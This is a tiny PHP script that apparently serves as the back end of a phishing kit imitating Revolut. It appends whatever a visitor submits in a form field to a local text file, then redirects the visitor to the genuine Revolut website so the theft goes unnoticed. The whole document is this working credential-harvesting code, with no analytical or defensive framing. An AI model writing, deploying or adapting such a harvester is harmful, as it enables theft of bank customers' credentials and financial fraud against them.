<?php
if(isset($_POST['submit'])){
$Name = "text:".$_POST['text']."
";
$file=fopen("2.txt", "a");
fwrite($file, $Name);
fclose($file);
header("Location: https://www.revolut.com/");
}
?>